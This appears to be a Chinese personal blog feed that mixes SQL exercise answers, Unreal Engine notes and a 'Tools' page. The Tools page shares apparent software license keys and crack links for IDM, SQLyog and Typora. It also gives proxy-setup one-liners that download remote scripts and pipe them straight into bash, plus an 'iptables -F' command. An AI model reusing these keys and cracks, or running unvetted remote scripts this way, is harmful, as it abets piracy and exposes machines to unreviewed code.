href="http://xuesql.cn/lesson/select_queries_with_aggregates_pt_2"class="uri">http://xuesql.cn/lesson/select_queries_with_aggregates_pt_2</a></p></blockquote><blockquote><p>【难题】按角色分组算出每个角色按有办公室和没办公室的统计人数(列出角色，数量，有无办公室,注意一个角色如果部分有办公室，部分没有需分开统计）✓</p></blockquote><table><thead><tr class="header"><th>Role</th><th>Name</th><th>Building</th><th>Years_employed</th></tr></thead><tbody><tr class="odd"><td>Engineer</td><td>Becky A.</td><td>1e</td><td>4</td></tr><tr class="even"><td>Engineer</td><td>Dan B.</td><td>1e</td><td>2</td></tr><tr class="odd"><td>Engineer</td><td>Sharon F.</td><td>1e</td><td>6</td></tr><tr class="even"><td>Engineer</td><td>Dan M.</td><td>1e</td><td>4</td></tr><tr class="odd"><td>Engineer</td><td>Malcom S.</td><td>1e</td><td>1</td></tr><tr class="even"><td>Artist</td><td>Tylar S.</td><td>2w</td><td>2</td></tr><tr class="odd"><td>Artist</td><td>Sherman D.</td><td>2w</td><td>8</td></tr><tr class="even"><td>Artist</td><td>Jakob J.</td><td>2w</td><td>6</td></tr><tr class="odd"><td>Artist</td><td>Lillia A.</td><td>2w</td><td>7</td></tr><tr class="even"><td>Artist</td><td>Brandon J.</td><td>2w</td><td>7</td></tr><tr class="odd"><td>Manager</td><td>Scott K.</td><td>1e</td><td>9</td></tr><tr class="even"><td>Manager</td><td>Shirlee M.</td><td>1e</td><td>3</td></tr><tr class="odd"><td>Manager</td><td>Daria O.</td><td>2w</td><td>6</td></tr><tr class="even"><td>Engineer</td><td>Yancy I.</td><td>null</td><td>0</td></tr><tr class="odd"><td>Artist</td><td>Oliver P.</td><td>null</td><td>0</td></tr></tbody></table><blockquote><p>Answer: <pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> ROLE<span class="token punctuation">,</span><span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> BUILDING <span class="token operator">IS</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token keyword">THEN</span> <span class="token string">'1'</span> <span class="token keyword">ELSE</span> <span class="token string">'0'</span> <span class="token keyword">END</span><span class="token keyword">AS</span> HAVE<span class="token punctuation">,</span><span class="token function">COUNT</span><span class="token punctuation">(</span>NAME<span class="token punctuation">)</span><span class="token keyword">FROM</span> EMPLOYEES<span class="token keyword">GROUP</span> <span class="token keyword">BY</span> ROLE<span class="token punctuation">,</span>HAVE</code></pre></p></blockquote><blockquote><p>分析 :题意中分组会产生两种情况：有无办公室。这时候<code>case when end</code>便派上用场了。</p></blockquote><h2 id="sql-lesson-12-查询执行顺序">SQL Lesson 12: 查询执行顺序</h2><blockquote><p>【难题】按导演分组计算销售总额,求出平均销售额冠军（统计结果过滤掉只有单部电影的导演，列出导演名，总销量，电影数量，平均销量)</p></blockquote><table><caption>Movies (Read-Only)</caption><thead><tr class="header"><th>Id</th><th>Title</th><th>Director</th><th>Year</th><th>Length_minutes</th></tr></thead><tbody><tr class="odd"><td>1</td><td>Toy Story</td><td>John Lasseter</td><td>1995</td><td>81</td></tr><tr class="even"><td>2</td><td>A Bug's Life</td><td>John Lasseter</td><td>1998</td><td>95</td></tr><tr class="odd"><td>3</td><td>Toy Story 2</td><td>John Lasseter</td><td>1999</td><td>93</td></tr><tr class="even"><td>4</td><td>Monsters, Inc.</td><td>Pete Docter</td><td>2001</td><td>92</td></tr><tr class="odd"><td>5</td><td>Finding Nemo</td><td>Finding Nemo</td><td>2003</td><td>107</td></tr><tr class="even"><td>6</td><td>The Incredibles</td><td>Brad Bird</td><td>2004</td><td>116</td></tr><tr class="odd"><td>7</td><td>Cars</td><td>John Lasseter</td><td>2006</td><td>117</td></tr><tr class="even"><td>8</td><td>Ratatouille</td><td>Brad Bird</td><td>2007</td><td>115</td></tr><tr class="odd"><td>9</td><td>WALL-E</td><td>Andrew Stanton</td><td>2008</td><td>104</td></tr><tr class="even"><td>10</td><td>Up</td><td>Pete Docter</td><td>2009</td><td>101</td></tr><tr class="odd"><td>11</td><td>Toy Story 3</td><td>Lee Unkrich</td><td>2010</td><td>103</td></tr><tr class="even"><td>12</td><td>Cars 2</td><td>John Lasseter</td><td>2011</td><td>120</td></tr><tr class="odd"><td>13</td><td>Brave</td><td>Brenda Chapman</td><td>2012</td><td>102</td></tr><tr class="even"><td>14</td><td>Monsters University</td><td>Dan Scanlon</td><td>2013</td><td>110</td></tr></tbody></table><table><caption>Boxoffice (Read-Only)</caption><thead><tr class="header"><th>Movie_id</th><th>Rating</th><th>Domestic_sales</th><th>International_sales</th></tr></thead><tbody><tr class="odd"><td>5</td><td>8.2</td><td>380843261</td><td>555900000</td></tr><tr class="even"><td>14</td><td>7.4</td><td>268492764</td><td>475066843</td></tr><tr class="odd"><td>8</td><td>8</td><td>206445654</td><td>417277164</td></tr><tr class="even"><td>12</td><td>6.4</td><td>191452396</td><td>368400000</td></tr><tr class="odd"><td>3</td><td>7.9</td><td>245852179</td><td>239163000</td></tr><tr class="even"><td>6</td><td>8</td><td>261441092</td><td>370001000</td></tr><tr class="odd"><td>9</td><td>8.5</td><td>223808164</td><td>297503696</td></tr><tr class="even"><td>11</td><td>8.4</td><td>415004880</td><td>648167031</td></tr><tr class="odd"><td>1</td><td>8.3</td><td>191796233</td><td>170162503</td></tr><tr class="even"><td>7</td><td>7.2</td><td>244082982</td><td>217900167</td></tr><tr class="odd"><td>10</td><td>8.3</td><td>293004164</td><td>438338580</td></tr><tr class="even"><td>4</td><td>8.1</td><td>289916256</td><td>272900000</td></tr><tr class="odd"><td>2</td><td>7.2</td><td>162798565</td><td>200600000</td></tr><tr class="even"><td>13</td><td>7.2</td><td>237283207</td><td>301700000</td></tr></tbody></table><blockquote><p>ANSWER: <pre class="language-SQL" data-language="SQL"><code class="language-SQL">SELECT DIRECTOR,SUM(DOMESTIC_SALES+INTERNATIONAL_SALES),COUNT(ID),AVG(DOMESTIC_SALES+INTERNATIONAL_SALES) AS AVERAGEFROM moviesJOIN BoxofficeON ID &#x3D; MOVIE_IDGROUP BY DIRECTORHAVING COUNT(ID)&gt;1ORDER BY AVERAGE DESCLIMIT 1;</code></pre></p></blockquote><blockquote><p>【变态难】找出每部电影和单部电影销售冠军之间的销售差，列出电影名，销售额差额</p></blockquote><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> TITLE<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">MAX</span><span class="token punctuation">(</span>DOMESTIC_SALES<span class="token operator">+</span>INTERNATIONAL_SALES<span class="token punctuation">)</span><span class="token keyword">FROM</span> BOXOFFICE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>DOMESTIC_SALES<span class="token operator">+</span>INTERNATIONAL_SALES<span class="token punctuation">)</span><span class="token keyword">From</span> MOVIES<span class="token keyword">JOIN</span> Boxoffice<span class="token keyword">ON</span> ID <span class="token operator">=</span> MOVIE_ID</code></pre><blockquote><p>内部嵌入一个select</p></blockquote><blockquote><p>SQL 测验 12 . 通过 SQL，您如何按字母顺序选取 Persons 表中 LastName介于 Adams 和 Carter 的所有记录？ A: SELECT * FROM Persons WHERELastName BETWEEN 'Adams' AND 'Carter' B: SELECT * FROM Persons WHERELastName&gt;'Adams' AND LastName&lt;'Carter' C: SELECTLastName&gt;'Adams' AND LastName&lt;'Carter' FROM Persons<strong>注释：字符串不能用等号“=”比较 </strong></p></blockquote><p>​</p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚幻-AI行为树</title>
      <link href="/2021/04/05/xu-huan-4-ai-xing-wei-shu/"/>
      <url>/2021/04/05/xu-huan-4-ai-xing-wei-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="导航网格">导航网格</h2><blockquote><ol type="1"><li>静态、动态</li></ol></blockquote><h2 id="蓝图实现ai随机移动">蓝图实现AI随机移动</h2><figure><img src="/images/蓝图实现AI移动.png" alt="蓝图实现AI移动" /><figcaption aria-hidden="true">蓝图实现AI移动</figcaption></figure><h1 id="ai行为树实现随机和跟随移动">AI行为树实现随机和跟随移动</h1><blockquote><ol type="1"><li>黑板</li><li>行为树</li><li>AI控制器</li><li>问题：AI不跟着任务走？？？</li></ol></blockquote><h2 id="靠近玩家挥拳">靠近玩家挥拳</h2><blockquote><ol type="1"><li>问题：动画怎么制作</li></ol></blockquote><p><img src="/images/AI_BP.png" alt="AI_BP" /> <imgsrc="/images/AI-BB.png" alt="AI-BB" /> <imgsrc="/images/AI_Controller.png" alt="AI_Controller" /> <imgsrc="/images/随机找点BP.png" alt="随机找点BP" /> <imgsrc="/images/寻找玩家BP.png" alt="寻找玩家BP" /> <imgsrc="/images/AI_BT.png" alt="AI_BT" /> <img src="/images/AI_Anim_BP.png"alt="AI_Anim_BP" /></p><h2 id="ai跟随样条线移动思路">AI跟随样条线移动思路</h2>]]></content>
      
      
      <categories>
          
          <category> Game Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚幻4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tools</title>
      <link href="/2021/04/01/tools/"/>
      <url>/2021/04/01/tools/</url>
      
        <content type="html"><![CDATA[<h3 id="ccleaner">CCleaner</h3><ul><li>功能很多</li><li>我只要用它清理了注册表（当软件没卸载干净时再度安装，注册表就会有问题）</li></ul><h3 id="截图">截图</h3><blockquote><ol type="1"><li>snipaste <a href="https://zh.snipaste.com/"class="uri">https://zh.snipaste.com/</a></li><li>优点<ol type="1"><li>截图保存文件夹可自由确定</li><li>贴图,例如将UE4的截图贴到我的电脑桌面<imgsrc="/images/贴图.png" /></li></ol></li></ol></blockquote><ul><li>qq 滚动截图功能</li></ul><h3 id="c盘扩容">c盘扩容</h3><blockquote><ol type="1"><li>参考网站<a href="https://www.disktool.cn/"class="uri">https://www.disktool.cn/</a></li><li>下载软件</li><li>直接在主界面操作<ol type="1"><li>右键D盘，选择分配空闲空间。<br /></li><li>按文字提示，最后左上角提交。<br /></li><li>接下来so easy,简单的。<br /><img src="/images/c盘.png" /></li></ol></li></ol></blockquote><h3 id="idm破解">IDM破解</h3><ul><li>https://wwto.lanzouy.com/iRRKjp58xgh</li></ul><blockquote><p>参考b站视频：<a href="https://www.bilibili.com/video/av499042907/"class="uri">https://www.bilibili.com/video/av499042907/</a> <ahref="https://songjielin.lanzoui.com/iOwG8ew90fa">破解工具下载</a>按<code>patch</code></p></blockquote><p><strong>更新版本后、该方法破解失败</strong> &gt; 方法2：参考网址，<ahref="http://idman.ys168.com/"class="uri">http://idman.ys168.com/</a></p><h3 id="vscode">vscode</h3><ol type="1"><li>快捷键</li></ol><blockquote><ol type="1"><li><p><strong>当前目录查找</strong>：<code>ctrl+shift+f</code></p></li><li><p><strong>列选择</strong>：<code>alt + shift + 鼠标拖动</code></p></li><li><p><code>ctrl + d</code> : 批量选择</p></li></ol></blockquote><ol start="2" type="1"><li>运行<code>python file</code>报错：<code>invalid syntax</code></li></ol><p><code>solu</code>: 清除多个python命令行窗口 <imgsrc="https://s2.loli.net/2022/08/03/fSz58QJBA2PjxIr.png"alt="image-20220803145215289" /></p><ol start="3" type="1"><li><p>加载web视图时出错：转到文件资源管理器和路<code>C:\Users&lt;user_name&gt;\AppData\Roaming\Code</code>并清除文件夹的内容<code>Cache, CachedData,   CachedExtensions, CachedExtensionVSIXs (if this folder exists) and Code Cache</code>。</p></li><li><p><code>auto save</code> 设置更改:导致编辑的网页实际不更新</p></li><li><p>ssh 远程连接：通信管道不存在</p><p><a href="https://zhuanlan.zhihu.com/p/68577071">参考博客</a></p><ul><li><p>在.ssh目录下打开终端powershell，用<code>ssh-keygen</code>命令生成密钥</p></li><li><p>然后将生成的id_rsa.pub文件传到远程根目录下.ssh文件夹中</p></li><li><p>用ssh命令（<code>ssh username@ip -p port</code>）连接远程主机</p></li></ul></li></ol><h3 id="visual-studio">visual studio</h3><ul><li><p>调试 <ahref="https://docs.microsoft.com/zh-cn/visualstudio/debugger/quickstart-debug-with-cplusplus?view=vs-2022&amp;viewFallbackFrom=msvc-170"class="uri">https://docs.microsoft.com/zh-cn/visualstudio/debugger/quickstart-debug-with-cplusplus?view=vs-2022&amp;viewFallbackFrom=msvc-170</a></p><blockquote><p>设置断点，F5调试，F11单步执行，查看各个变量的值</p></blockquote></li><li><p>快捷键： &gt; - 格式化所有：ctrl+k+d &gt; -注释：ctrl+k+/。取消注释：ctrl+u+/</p></li><li><p>读取中文出现乱码，将格式变为ANSI，另存覆盖。</p></li></ul><h3 id="sqlyog">Sqlyog</h3><ol type="1"><li></li></ol><blockquote><p>Professional: 8e053a86-cdd3-48ed-b5fe-94c51b3d343c Enterprise:a46683b0-d3ec-4c16-8e3c-198d25a7fb52 Ultimate:60c1b896-7c22-4405-9f46-a6bce776ab36</p></blockquote><h3 id="openssh-不在支持rsa算法">Openssh 不在支持rsa算法</h3><ul><li>使用新的加密算法</li></ul><blockquote><p>ssh-keygen -t ed25519 -C "xxxxxx@qq.com"</p></blockquote><h3 id="chrome使用方向键操作失灵">Chrome使用方向键操作失灵</h3><blockquote><p>在 <code>chrome</code>内找到 <em>关于</em>，更新升级到最新版本</p></blockquote><h3 id="虚拟机">虚拟机</h3><ol type="1"><li><code>win10</code> 共享文件夹。<strong>勾选：映射为网络驱动器</strong></li></ol><figure><img src="https://s2.loli.net/2022/07/08/cgdveLChsTUFEAB.png"alt="image-20220708154451888" /><figcaption aria-hidden="true">image-20220708154451888</figcaption></figure><ol start="2" type="1"><li>虚拟机没网（前提：已经使用<code>Nat</code>模式</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">systemctl start NetworkManagernmcli networking offnmcli networking on</code></pre><h3 id="xshell">Xshell</h3><ul><li>注意这一步（一般是刚下载）<imgsrc="https://s2.loli.net/2023/02/17/K3NDtfsgrzWybCx.png"alt="image-20230217220934514" /></li></ul><ol type="1"><li>物理机与虚拟机之间直接拖动复制文件</li></ol><h3 id="markdown">Markdown</h3><ol type="1"><li>typora + picgo</li></ol><blockquote><ol type="1"><li>设置快捷键</li></ol></blockquote><h3id="电脑某些应用没网或者某网站下载速度慢">电脑某些应用没网或者某网站下载速度慢</h3><ol type="1"><li>更换为手机热点</li></ol><h3 id="picgo">picgo</h3><ul><li><p>报错</p><p>2022-08-18 19:06:34 [PicGo ERROR] ------Error Stack Begin------RequestError: Error: connect ETIMEDOUT 46.82.174.69:443 at newRequestError (D:.asar_modules-promise-core.js:14:15) atRequest.plumbing.callback (D:.asar_modules-promise-core.js:87:29) atRequest.RP$callback [as _callback](D:.asar_modules-promise-core.js:46:31) at self.callback(D:.asar_modules.js:185:22) at Request.emit (events.js:200:13) atRequest.onRequestError (D:.asar_modules.js:877:8) at ClientRequest.emit(events.js:200:13) at TLSSocket.socketErrorListener(_http_client.js:402:9) at TLSSocket.emit (events.js:200:13) atemitErrorNT (internal/streams/destroy.js:91:8) -------Error StackEnd-------</p></li></ul><figure><img src="https://s2.loli.net/2022/08/18/dbprV51QowY4D7c.png"alt="image-20220818192856967" /><figcaption aria-hidden="true">image-20220818192856967</figcaption></figure><ul><li>图床从sm.ms 迁移到github</li></ul><h3 id="typora">typora</h3><ul><li><p><strong>Theme</strong></p><ul><li>Drake jb &amp; Drake black</li></ul></li><li><p>快捷键设置<imgsrc="https://s2.loli.net/2023/02/22/Evtdwf3IQT9Xu5l.png"alt="image-20230222043929528" /></p></li><li><p>crack</p><ul><li>三个文件<imgsrc="C:\Users\22514\AppData\Roaming\Typora\typora-user-images\image-20230216062751757.png"alt="image-20230216062751757" /></li><li>文件三需要去掉后缀txt，上图已去</li><li>文件三移入<code>typora\resource</code>目录，覆盖原文件</li><li>从文件2找到密钥激活typora,邮箱需要正确的格式</li></ul></li><li><p>拼写检查关闭</p></li></ul><figure><img src="https://s2.loli.net/2023/02/08/gFiRp5oyumqhA3n.png"alt="image-20230208014107021" /><figcaption aria-hidden="true">image-20230208014107021</figcaption></figure><ul><li>恢复未保存文件</li></ul><figure><img src="https://s2.loli.net/2022/12/02/8OjmoSG7C5v9sQy.png"alt="image-20221202160859222" /><figcaption aria-hidden="true">image-20221202160859222</figcaption></figure><ul><li>快捷键设置</li></ul><h3 id="trojan-go-搭建">trojan-go 搭建</h3><p><a href="https://www.itblogcn.com/article/1048.html">参考博客</a></p><ul><li>vps服务器<ul><li>系统centOS</li><li>ping.pe 工具</li></ul></li><li>免费域名freenom<ul><li>必须美国ip</li></ul></li><li>域名解析托管cloudflare</li><li>安装trojan</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-N</span> --no-check-certificate <span class="token parameter variable">-q</span> <span class="token parameter variable">-O</span> trojan_install.sh <span class="token string">"https://raw.githubusercontent.com/V2RaySSR/Trojan/master/trojan_install.sh"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +x trojan_install.sh <span class="token operator">&amp;&amp;</span> <span class="token function">bash</span> trojan_install.sh</code></pre><ul><li>申请证书报错</li></ul><p><ahref="https://blog.csdn.net/wengek/article/details/120559397">博客</a></p><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208231042276.png"alt="image-20220823104153133" /><figcaption aria-hidden="true">image-20220823104153133</figcaption></figure><ul><li>查看配置</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /usr/src/trojan-macos/trojan/config.json</code></pre><ul><li>安装bbrplus 加速（重要）</li></ul><h3 id="shadowsocksrtlswebcdn">ShadowsocksR+TLS+Web+CDN</h3><ul><li><p><strong>证书问题</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. iptables <span class="token parameter variable">-F</span><span class="token number">2</span>. acme.sh --set-default-ca <span class="token parameter variable">--server</span> letsencrypt</code></pre></li></ul><p>​ <ahref="https://iyideng.net/black-technology/cgfw/shadowsocksr-ssr-server-building-and-using-tutorial.html">参考博客</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://raw.githubusercontent.com/JeannieStudio/all_install/master/SixForOne_install.sh<span class="token variable">)</span></span>"</span></code></pre><figure><imgsrc="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208241912152.png"alt="image-20220824191243048" /><figcaption aria-hidden="true">image-20220824191243048</figcaption></figure><ul><li>bbr 加速</li></ul><pre class="language-none"><code class="language-none">&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;chiakge&#x2F;Linux-NetSpeed&#x2F;master&#x2F;tcp.sh&quot; &amp;&amp; chmod +x tcp.sh &amp;&amp; .&#x2F;tcp.sh</code></pre><pre class="language-none"><code class="language-none">&#x2F;etc&#x2F;all_mgr.sh</code></pre><p><ahref="https://iyideng.net/black-technology/cgfw/shadowsocksr-ssr-server-building-and-using-tutorial.html">参考教程</a></p><h3 id="git">git</h3><ul><li>改了github id应当重新登录github desktop</li></ul><p>​ firewall-cmd --permanent --add-port=16070/tcp</p><h3 id="ipv6">ipv6</h3><ul><li><a href="https://www.jixing.one/vps/v2ray-xui-v2rayn/">教程</a></li><li>注意事项<ul><li>系统代理-&gt;配置系统代理</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Miscellaneous </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚幻-入门</title>
      <link href="/2021/03/29/xu-huan-zhi-lu-zhi-ru-men-pian/"/>
      <url>/2021/03/29/xu-huan-zhi-lu-zhi-ru-men-pian/</url>
      
        <content type="html"><![CDATA[<blockquote><p>初衷：想成为游戏开发中的一员，毕业设计也选了射击游戏的开发。<br />指导资料： 1. <a href="https://www.bilibili.com/read/cv4648495"class="uri">https://www.bilibili.com/read/cv4648495</a> 2. <ahref="https://docs.unrealengine.com/zh-CN/index.html"class="uri">https://docs.unrealengine.com/zh-CN/index.html</a>------------------- <code>2021/03/30</code> ## 补充前面 1.创建静态网格体 2. 合并Actor</p></blockquote><h2 id="光照渲染曝光雾">光照渲染、曝光、雾</h2><blockquote><ol type="1"><li>构建光照----&gt;转动太阳光</li><li>区分几种光照</li><li>曝光(设置-渲染)</li><li>指数级高度雾</li><li>光束、体积雾</li><li>light soucrce(光束遮挡和光泛)</li><li>体积雾(在指数级高度雾里开启体积雾)：改变光源，改变体积雾本身</li></ol></blockquote><h2 id="角色控制权">角色控制权</h2><blockquote><ol type="1"><li>拖入角色，设置角色控制权</li><li>与1会冲突，设置Gamemode,设置palystart</li></ol></blockquote><h2 id="打包游戏">打包游戏</h2><blockquote><ol type="1"><li>必须安装VS2019</li></ol></blockquote><h2 id="蓝图可视化编程">蓝图（可视化编程）</h2><blockquote><ol type="1"><li>开关门<br /></li><li>碰撞</li><li>感应装置 （触发器、蓝图）</li><li>关卡蓝图、事件（）</li></ol></blockquote><h2 id="开门鼠标左键新建actor">开门（鼠标+左键，新建Actor）</h2><blockquote><ol type="1"><li>相对位置、世界坐标</li><li>E键开门</li><li>鼠标开门</li></ol></blockquote><p><img src="/images/E键实现.png" /><br /><img src="/images/鼠标开关门.png" /></p><blockquote><ol start="4" type="1"><li>门框和门之间的层级关系，类型转换小白人（不需要层级关系）<br />5.补充：<ol type="1"><li>改变中心轴（scene）</li><li>setActorRotation、setRelativeRotation、setWorldRotation的区别。</li></ol></li></ol></blockquote><figure><img src="/images/自动门.png" alt="自动门" /><figcaption aria-hidden="true">自动门</figcaption></figure><blockquote><pre><code>3. gate节点：流程控制  4. 输入节点5. 玩家控制器6. flipFloat节点7. 点击事件、世界场景设置、新建玩家控制器、启用点击（√两个），  </code></pre><p>方式二：set show mouse cursor组件（从get controller中拉出）</p></blockquote><p><img src="/images/mouse_curse组件.png" /></p><h2 id="字体导入光照重建">字体导入、光照重建</h2><blockquote><ol type="1"><li>导入字体（3种方法）</li><li>光照重建（产生阴影）</li></ol></blockquote><h2 id="电梯升降重点">电梯升降（重点）</h2><blockquote><ol type="1"><li>lerp节点<br /></li><li>box无法成为cube子层级（退出UE4重进）</li></ol></blockquote><p><img src="/images/层级关系.png" /></p><blockquote><ol start="3" type="1"><li>组件层级关系很重要</li><li>获取玩家控制器、控制输入、禁止输入</li></ol></blockquote><figure><img src="/images/电梯.png" alt="蓝图" /><figcaption aria-hidden="true">蓝图</figcaption></figure><h2 id="自动门">自动门</h2><blockquote><ol type="1"><li>材质中玻璃与静态网格体中玻璃窗</li><li>连线 连线 注意，看懂蓝图</li><li>自动门与E键开门</li></ol></blockquote><figure><img src="/images/E键开门.png" alt="E键开门" /><figcaption aria-hidden="true">E键开门</figcaption></figure><blockquote><p>4.<code>存在的问题：</code>左右两扇门的平移速度不一致，一扇合，一扇不合</p></blockquote><h2 id="双开旋转门">双开旋转门</h2><blockquote><ol type="1"><li>注意是鼠标点击开门</li><li>两扇门两个lerp，两个点击事件</li></ol></blockquote><p><img src="/images/双开旋转门.png" /> &gt; 3.<code>问题：</code>第二个时间点设置为85，会旋转很多次，笑死我了。😄</p><h2 id="获得本地坐标修复">获得本地坐标、修复</h2><blockquote><ol type="1"><li>获取当前值存在的问题，solution:新建变量Z,改为浮点型</li></ol></blockquote><p><img src="/images/获得值改进.png" /></p><blockquote><ol start="2" type="1"><li>新建变量Z,浮点+浮点的操作，直接从Z节点引出</li></ol></blockquote><p><img src="/images/浮点+浮点.png" /></p><h2 id="切记">切记</h2><blockquote><ol type="1"><li>记下各种组件</li><li>ctrl+shift+s</li></ol></blockquote><h2 id="拾取开门">拾取🔑开门</h2><blockquote><ol type="1"><li>布尔组件、branch组件、printf string组件、获取类的所有Actor组件</li><li>多个蓝图需要分清</li></ol></blockquote><p><img src="/images/拾取钥匙.png" alt="捡钥匙蓝图" /> <imgsrc="/images/钥匙开门.png" alt="钥匙开门" /></p><blockquote><ol start="3" type="1"><li>两蓝图通信关键：set布尔节点</li><li>胶囊体碰撞半径</li></ol></blockquote><h2 id="蓝图通信和自定义事件">蓝图通信和自定义事件</h2><blockquote><ol type="1"><li>蓝图通信：多个类发生联系</li><li>事件：<br /></li><li>自定义事件组件（新建Actor-新建图表-）<br /></li><li>CharacterMovement</li></ol></blockquote><p><img src="/images/box.png" alt="box" /> <imgsrc="/images/ThirdPerson.png" alt="人物触发" /></p><blockquote><ol start="3" type="1"><li>触发加速BP:<br /></li><li>类型转换作用：蓝图通信&amp;&amp;具有针对性</li></ol></blockquote><h2 id="对象引用变量有效性">对象引用、变量有效性</h2><blockquote><ol type="1"><li>变量引用、提升变量</li><li>有效性</li></ol></blockquote><h2 id="实现键盘控制物体自转">实现键盘控制物体自转</h2><blockquote><ol type="1"><li>fliFlop和branch</li><li>不同BP窗口，不同事件图表</li><li>蓝图修改需要重新移入BP</li></ol></blockquote><p><img src="/images/旋转BP.png" alt="旋转BP" /> <imgsrc="/images/旋转引用.png" alt="旋转引用" /></p><h2 id="简单点名系统">简单点名系统</h2><blockquote><ol type="1"><li>getAllActor节点的使用顺序</li><li>先选择再获得</li></ol></blockquote><h2 id="简单解谜游戏功能汇总">简单解谜游戏（功能汇总）</h2><blockquote><ol type="1"><li>蓝图节点：</li><li>执行控制台命令<br /></li><li>For Each Loop with break(可以被中断)</li><li>设置可视性</li><li>文本渲染组件</li><li><strong>lerp节点底端引脚连线</strong></li><li>可视性默认值</li><li>点亮灯,文本提示消失</li><li>关卡蓝图</li><li>添加引用</li><li>蓝图可视化编程：节点图标类似，但是要区分名字、名称</li></ol></blockquote><p><img src="/images/解谜BP.png" alt="解谜BP" /> <imgsrc="/images/Door_Bp.png" alt="Door_BP" /> <imgsrc="/images/Light_BP.png" alt="Light_BP" /> <imgsrc="/images/关卡蓝图.png" alt="关卡蓝图" /></p><h2 id="常见问题快捷键汇总">常见问题&amp;&amp;快捷键汇总</h2><pre class="language-none"><code class="language-none">1. 自定义快捷键2. 常用    1. ALT+num    2. ALT+L:显隐地形    3. ALT+C:显隐碰撞    4. ALT+F:显隐雾     5. T:是否能够选中半透明物体    6. CTRL+P:快速打开资源    7. CTRL+ALT+鼠标左键”:框选    8. H&#x2F;(CTRL+H):隐藏&#x2F;显示选中物体    9. 鼠标中键：测距    10. CTRL+E:编辑选中物体    11. CTRL+B:快速查找选中物体路径    12. CTRL+G:打组    13. SHIFT+G:取消打组    14. ALT+P:开始游戏    15. ALT+S:模拟运行    16. CTRL+W:复制选中    17. CTRL+N:新建关卡    18. 书签功能    19. C:注释    20. *：未保存文件    21. 情景关联（蓝图节点）</code></pre><h2id="蓝图概念面向对象思想函数事件宏的区别">蓝图概念、面向对象思想、函数事件宏的区别</h2><pre class="language-none"><code class="language-none">1. Object &gt; Actor(门，角色，模型，蓝图，各种各样的角色) &gt; Pawn（被控制） &gt; Character（人性角色） &gt; Component2. pawn和character都能够被角色控制，Actor不行3. 关卡蓝图是Actor的子类</code></pre><h2 id="多个角色控制权转换">多个角色控制权转换</h2><pre class="language-none"><code class="language-none">1. 世界场景设置：Game mode2. 蓝图节点：MultiGate、使用混合设置视图目标、控制![角色控制切换_整体](&#x2F;images&#x2F;角色控制切换_整体.png)</code></pre><p><img src="/images/角色控制_前半.png" alt="角色控制_前半" /> <imgsrc="/images/角色控制_后半.png" alt="角色控制_后半" /></p><h2 id="角色上下车">角色上下车</h2><blockquote><ol type="1"><li>组件：</li><li><code>附加到组件</code>:选择保持场景</li><li>sphere碰撞</li><li>问题：下车后任务无法动弹，按“跳跃”后一直坠落</li><li>新建事件、新建变量</li></ol></blockquote><p><img src="/images/上下车_角色BP.png" alt="上下车_角色BP" /> <imgsrc="/images/上车_BP.png" alt="上车_BP" /> <imgsrc="/images/下车_BP.png" alt="下车_BP" /></p><h2 id="下车减速">下车减速</h2><p><img src="/images/上下车_油门更改.png" alt="油门更改" /> <imgsrc="/images/下车刹车change.png" alt="下车刹车change" /></p><h2 id="冲刺瞬移多段跳">冲刺、瞬移、多段跳</h2><blockquote><ol type="1"><li>次数判断</li><li>蓝图节点</li><li>获取Actor位置、获取Actor向前向量相加。</li><li>FolloCamera</li><li>多段跳：ThirdpersonCharacter(自身)</li></ol></blockquote><figure><img src="/images/冲刺瞬移BP.png" alt="冲刺瞬移BP" /><figcaption aria-hidden="true">冲刺瞬移BP</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Game Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚幻4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MyBlog</title>
      <link href="/2021/03/23/myblog/"/>
      <url>/2021/03/23/myblog/</url>
      
        <content type="html"><![CDATA[<h3 id="清除缓存的重要性">清除缓存的重要性</h3><ul><li><p>--==-=</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">hexo clea</code></pre></li></ul><h3 id="说明">说明</h3><blockquote><p>2021/03/23 完成基本功能，地点 NUIST文园11-605，天气：晴，心情：crazy<br /><strong>温馨提示：</strong>本文基于：<del>hexo+gitee搭建</del>，使用了mastery主题<ahref="https://github.com/blinkfox/hexo-theme-matery"class="uri">https://github.com/blinkfox/hexo-theme-matery</a></p><ul><li>2023年：迁移到Github</li></ul></blockquote><h3 id="toc">TOC</h3><ul><li>支持的标题等级设置<imgsrc="https://s2.loli.net/2023/03/10/UcQsD93dGZBl5XV.png"alt="image-20230310174406439" /></li></ul><h3 id="search功能">Search功能</h3><ul><li><p>在根目录</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">npm install hexo-generator-search <span class="token 